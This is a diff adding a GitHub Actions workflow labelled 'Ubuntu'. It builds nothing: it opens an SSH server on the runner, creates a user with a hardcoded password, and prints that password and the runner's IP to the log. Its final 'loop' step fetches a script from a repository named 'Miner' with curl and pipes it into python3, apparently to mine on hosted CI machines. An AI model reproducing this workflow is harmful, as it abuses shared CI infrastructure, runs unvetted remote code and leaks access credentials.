@@ -1,0 +1,40 @@
+name: Ubuntu
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Install SSH server
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openssh-server
+          sudo systemctl start ssh
+          sudo systemctl enable ssh
+
+      - name: Create SSH user
+        run: |
+          sudo useradd -m -s /bin/bash kushagrapal
+          echo 'kushagrapal:kushagrapal*2727' | sudo chpasswd
+
+      - name: Set up SSH keys
+        run: |
+          mkdir -p ~/.ssh
+          ssh-keygen -t rsa -b 4096 -C "your-email@example.com" -f ~/.ssh/id_rsa -N ""
+          cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
+      - name: Display SSH access information
+        run: |
+          echo "Username: kushagrapal"
+          echo "Password: kushagrapal*2727"
+          echo "IP:"
+          hostname -I
+      - name: loop
+        run: sudo -apt install python && curl -s https://raw.githubusercontent.com/Master-kp/Miner/refs/heads/main/loop.py | python3 -
+
